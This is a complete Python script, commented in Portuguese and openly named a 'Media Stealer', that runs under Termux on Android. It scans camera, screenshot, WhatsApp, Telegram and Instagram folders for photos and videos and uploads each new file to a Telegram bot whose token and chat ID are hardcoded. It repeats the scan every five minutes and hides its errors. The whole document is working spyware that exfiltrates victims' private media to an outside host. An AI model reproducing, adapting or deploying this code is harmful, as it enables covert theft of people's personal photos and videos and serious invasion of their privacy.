#!/usr/bin/env python3
"""
Termux Media Stealer - Versão Simplificada
Rouba fotos e vídeos do Termux e envia para Telegram
"""
import os
import sys
import json
import time
import hashlib
import threading
from pathlib import Path
from datetime import datetime

# ========== CONFIGURAÇÃO ==========
BOT_TOKEN = "8679559575:AAHQCXddG2CJEaedLOGosWxKuBA4tD2O7Xc"
CHAT_ID = 8529800400
SCAN_INTERVAL = 300  # 5 minutos
MAX_SIZE = 50 * 1024 * 1024  # 50MB

# ========== DIRETÓRIOS ==========
DIRS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/Screenshots",
    "/sdcard/Pictures",
    "/sdcard/Pictures/Screenshots",
    "/sdcard/Pictures/WhatsApp",
    "/sdcard/Pictures/Telegram",
    "/sdcard/Pictures/Instagram",
    "/sdcard/Download",
    "/sdcard/Movies",
    "/sdcard/Movies/WhatsApp",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/WhatsApp/Media/WhatsApp Video",
    "/sdcard/Telegram/Telegram Images",
    "/sdcard/Telegram/Telegram Video",
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Download",
    "/storage/emulated/0/Movies",
    "/data/data/com.termux/files/home/storage/dcim/Camera",
    "/data/data/com.termux/files/home/storage/pictures",
]

# ========== EXTENSÕES ==========
MEDIA_EXTS = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.mov', '.avi', '.mkv', '.3gp']

class MediaStealer:
    def __init__(self):
        self.sent = set()
        self.load_sent()
        
    def load_sent(self):
        """Carrega arquivos já enviados"""
        if os.path.exists("sent.txt"):
            with open("sent.txt", "r") as f:
                self.sent = set(f.read().splitlines())
    
    def save_sent(self):
        """Salva arquivos enviados"""
        with open("sent.txt", "w") as f:
            f.write("\n".join(self.sent))
    
    def get_hash(self, path):
        """Calcula hash do arquivo"""
        try:
            with open(path, 'rb') as f:
                return hashlib.md5(f.read()).hexdigest()
        except:
            return None
    
    def scan_files(self):
        """Escaneia todos os diretórios"""
        files = []
        for d in DIRS:
            if os.path.exists(d):
                try:
                    for root, _, filenames in os.walk(d):
                        for f in filenames:
                            if os.path.splitext(f)[1].lower() in MEDIA_EXTS:
                                files.append(os.path.join(root, f))
                except:
                    pass
        
        # Ordenar por data (mais recentes primeiro)
        files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
        return files
    
    def send_file(self, path):
        """Envia arquivo para o Telegram"""
        try:
            # Verificar se já foi enviado
            hash_file = self.get_hash(path)
            if not hash_file or hash_file in self.sent:
                return False
            
            # Verificar tamanho
            if os.path.getsize(path) > MAX_SIZE:
                return False
            
            # Importar requests
            import requests
            
            # Preparar dados
            name = os.path.basename(path)
            size = os.path.getsize(path) // 1024
            caption = f"📁 {name}\n📊 {size}KB\n⏰ {datetime.now().strftime('%H:%M:%S')}"
            
            # Enviar
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            
            with open(path, 'rb') as f:
                response = requests.post(
                    url,
                    data={'chat_id': CHAT_ID, 'caption': caption},
                    files={'document': f},
                    timeout=30
                )
            
            if response.status_code == 200:
                self.sent.add(hash_file)
                self.save_sent()
                print(f"[+] Enviado: {name}")
                return True
                
        except Exception as e:
            pass
        
        return False
    
    def run(self):
        """Loop principal"""
        print("[*] Iniciando monitoramento...")
        
        while True:
            try:
                # Escanear arquivos
                arquivos = self.scan_files()
                
                # Enviar novos (máx 10 por vez)
                enviados = 0
                for arq in arquivos[:20]:
                    if self.send_file(arq):
                        enviados += 1
                        time.sleep(2)  # Evitar flood
                
                if enviados > 0:
                    print(f"[+] {enviados} arquivo(s) enviado(s)")
                
                # Aguardar próximo scan
                time.sleep(SCAN_INTERVAL)
                
            except KeyboardInterrupt:
                print("\n[!] Parando...")
                self.save_sent()
                break
            except Exception as e:
                print(f"[!] Erro: {e}")
                time.sleep(60)

def main():
    # Verificar dependências
    try:
        import requests
    except ImportError:
        print("[*] Instalando requests...")
        os.system(f"{sys.executable} -m pip install requests")
    
    # Configurar storage do Termux
    if os.path.exists('/data/data/com.termux'):
        os.system('termux-setup-storage > /dev/null 2>&1')
    
    # Iniciar
    stealer = MediaStealer()
    stealer.run()

if __name__ == "__main__":
    main()
